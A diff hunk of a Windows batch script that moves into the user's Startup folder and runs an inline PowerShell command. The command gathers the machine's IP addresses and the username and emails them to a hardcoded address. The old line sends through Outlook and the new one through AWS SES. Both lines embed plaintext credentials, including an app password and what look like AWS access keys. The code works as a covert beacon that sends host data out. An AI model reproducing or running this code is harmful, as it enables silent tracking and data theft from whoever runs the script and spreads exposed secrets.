@@ -10,7 +10,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 @REM Set up SMTP
-powershell -NoProfile -Command " $email='fyp22356827@outlook.com'; $appPassword='qbpyymmalyudxsur'; $ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254*' }).IPAddress -join ', '; $subject = \"$env:UserName logs\"; $msg = New-Object System.Net.Mail.MailMessage; $msg.From = $email; $msg.To.Add($email); $msg.Subject = $subject; $msg.Body = $ip; $smtp = New-Object System.Net.Mail.SmtpClient('smtp.office365.com',587); $smtp.EnableSsl = $true; $smtp.UseDefaultCredentials = $false; $smtp.DeliveryMethod = [System.Net.Mail.SmtpDeliveryMethod]::Network; $smtp.Credentials = New-Object System.Net.NetworkCredential($email,$appPassword); $smtp.Send($msg) "
+powershell -NoProfile -Command "$email='lukeosullivan123@gmail.com'; $smtpUser='AKIAU2UDJAPS6AGCQU55'; $smtpPass='BBoDj+7tIeYSc9nwA+gmDyR1+tr8sR+EEdqPkX46exSi'; $ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.*' }).IPAddress -join ', '; $subject=\"$env:UserName logs\"; $msg=New-Object System.Net.Mail.MailMessage; $msg.From=$email; $msg.To.Add($email); $msg.Subject=$subject; $msg.Body=$ip; $smtp=New-Object System.Net.Mail.SmtpClient('email-smtp.eu-west-1.amazonaws.com',587); $smtp.EnableSsl=$true; $smtp.UseDefaultCredentials=$false; $smtp.DeliveryMethod=[System.Net.Mail.SmtpDeliveryMethod]::Network; $smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass); $smtp.Send($msg)"
 
 
 pause
